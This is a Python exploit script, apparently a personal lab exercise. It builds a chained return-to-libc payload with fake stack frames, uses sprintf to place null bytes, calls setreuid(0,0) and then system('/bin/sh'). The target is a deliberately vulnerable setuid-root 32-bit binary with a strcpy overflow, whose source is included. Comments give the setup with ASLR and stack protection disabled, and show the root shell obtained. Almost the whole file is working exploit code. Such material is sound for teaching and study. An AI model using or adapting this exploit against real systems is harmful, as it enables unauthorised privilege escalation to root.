#!/usr/bin/env python3
import os,struct

# no BOF canaries, stack NOT executable
# gcc -m32 -fno-stack-protector test.c -o test.elf



## Chaining return to libc
## Note stack NOT executable in this use case.
# note stack not executable
# gcc -m32 -fno-stack-protector test.c -o test.elf
# sudo chown root:root test.elf
# sudo chmod u+s test.elf
## Assumes ASLR is disabled
# sudo su
# echo 0 > /proc/sys/kernel/randomize_va_space
# ./$0
# $ id
# uid=0(root) gid=1000(qwerty) groups=1000(qwerty),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),123(sambashare) 
# Note gained root!


# Chaining Return to libc
# http://phrack.org/issues/58/4.html
# Might also help:
# https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/
# remember to align the first leaveret onto the CRASH address, or just as easy to lead the crash into the first function call, followed by a leaveret.
# Which means the fakeEPB0 frame address needs to come before that, i.e., remove four bytes of padding


libc_x = 0xf7dd4000  ## executable /lib32/libc-2.27.so region start
## Offsets calculated by for example:
## readelf -s /lib32/libc-2.27.so |grep -i exit
##    147: 0002ff70    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
##   1080: 000bde90   100 FUNC    WEAK   DEFAULT   13 pause@@GLIBC_2.0
##    502: 000ef380   156 FUNC    WEAK   DEFAULT   13 setreuid@@GLIBC_2.0
##   1554: 000ef4c0   188 FUNC    GLOBAL DEFAULT   13 seteuid@@GLIBC_2.0
##   1510: 0003cd10    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
##    108: 0007da20    59 IFUNC   GLOBAL DEFAULT   13 strcpy@@GLIBC_2.0
##    174: 00050bc0    28 FUNC    GLOBAL DEFAULT   13 sprintf@@GLIBC_2.0
## Function prototypes, courtesy of manpages
##  char *strcpy(char *dest, const char *src);                  # <string.h>
##  int sprintf(char *str, const char *format, (char * src_strng)...);     # <stdio.h>
##  int setreuid(uid_t ruid, uid_t euid);                       # <unistd.h>,<sys/types.h>
_exit =         struct.pack("<L", (libc_x + 0x2ff70))
_pause =        struct.pack("<L", (libc_x + 0xbde90))
_setreuid =     struct.pack("<L", (libc_x + 0xef380))
_seteuid =      struct.pack("<L", (libc_x + 0xef4c0))
_system =       struct.pack("<L", (libc_x + 0x3cd10))
_strcpy =       struct.pack("<L", (libc_x + 0x7da20))
_sprintf =      struct.pack("<L", (libc_x + 0x50bc0))
# 5655:559f|c9      leave
# 5655:55a0|c3      ret
_leaveret =     struct.pack("<L", 0x5655559f)
## Need some empty spaces to put null in places
# 5655:5a10|00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|................|
_nullptr =      struct.pack("<L", 0x56555a10)   ## literally 00 00 00 00
_zeroptr =      struct.pack("<L", 0x565552b9)   ## points to 30 00  (0\0)
_binsh_str =    struct.pack("<L", 0x565566c9) 
_fmt_str =      struct.pack("<L", 0xf7ff4f70)    ## "%s\0\0" 
### This is how this works.  fakeebp0 needs to point to the next frame's fakeebp, and so on.
## Frame looks like follows:
## The fake frame 0 needs to align such that, you have:
## ebp0 -> return address (WE CRASH HERE) -> *leaveret -> args if any -> fakeebp1
## SO crash address minus four bytes is where the payload begins, with ebp0 then a function call at crash, followed by the first leaveret, optionally args for the first function call, then the next ebp.   ebp0 points to location of ebp1 points to location of ebp2 and so on.
## Crash at "A"*30, so payload is "A"*26 + ebp0 + (CRASH) first function + leaveret + (optionally args to first function) + ebp1



#####  PAYLOAD:  Chaining return to libc
# param=b"edb --run ./test.elf '"
param=  b"./test.elf '"
param+= b"A"*30      ## next four bytes from here is return address pointed-to@crash
param= param[:-4]  ## need to bite into the pad by four bytes, 
                    ## because needs to hold the first ebp.

## CRASH ADDR ##
CRASH = 0xffffd56c  ## All payload calcs based on this addy!
## CRASH ADDR ##

## Need to build 0x00000000 on the stack, for arg to setreuid(), because can't BOF nullbytes!
_setreuid_arg1 = struct.pack("<L", CRASH - (0x4*1) + (0x4*27) )
_setreuid_arg2 = struct.pack("<L", CRASH - (0x4*1) + (0x4*27) +1)
_setreuid_arg3 = struct.pack("<L", CRASH - (0x4*1) + (0x4*27) +2)
_setreuid_arg4 = struct.pack("<L", CRASH - (0x4*1) + (0x4*27) +3)

# fake frame 0
febp0 = CRASH -0x4 + (0x4*6)  ## Points to location of febp1
param += struct.pack("<L",febp0)
param += _sprintf
param += _leaveret
param += _setreuid_arg1
param += _fmt_str
param += _nullptr

# fake frame 1
febp1 = febp0 + (0x4*6)
param += struct.pack("<L", febp1)
param += _sprintf
param += _leaveret
param += _setreuid_arg2
param += _fmt_str
param += _nullptr

# fake frame 2
febp2 = febp1 + (0x4*6)
param += struct.pack("<L", febp2)
param += _sprintf
param += _leaveret
param += _setreuid_arg3
param += _fmt_str
param += _nullptr

# fake frame 3
febp3 = febp2 + (0x4*6)
param += struct.pack("<L", febp3)
param += _sprintf
param += _leaveret
param += _setreuid_arg4
param += _fmt_str
param += _nullptr

# fake frame 4
febp4 = febp3 + (0x4*4)
param += struct.pack("<L", febp4)
param += _setreuid
param += _leaveret
param += struct.pack("<L",0xdeadbeef) ## gets overwritten with "\0\0\0\0"

# fake frame 5
febp5 = febp4 + (0x4*4)
param += struct.pack("<L", febp5)
param += _system
param += _leaveret
param += _binsh_str

# fake frame 5
febp6 = febp5 + (0x4*5)
param += struct.pack("<L", febp6)
# param += _pause
param += _exit
param += _leaveret
param += struct.pack("<L",0xffffffff) ## whatever, who cares


param += b"'"   ## close the string
print(param)
input()
os.system(b"%s" % param)



NOTES="""
// test.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//#include <unistd.h>  //eh... note not necessary to be included; can call implicit!

int functionfunction(char *param){
        char *localString = "Conjunction function";
        int localInt = 0xdeadbeef;
        // the vulnerable area of the program is right in the following char buffer.
        char localString2[10];
        // it is only made vulnerable when it is called by strcmp without proper
        // bounds checking!  Causing a buffer overflow.
        strcpy(localString2,param);
        printf("10-byte user-supplied argument: %s", localString2);
        return(1);
}

int main(int *argc, char *argv[]){
        char *localString = "Function main";
        int localInt = 0x11223344;
        char *yolo = "/bin/bash";   // fuck it right into memory
        functionfunction(argv[1]);
        return(1);
}
"""
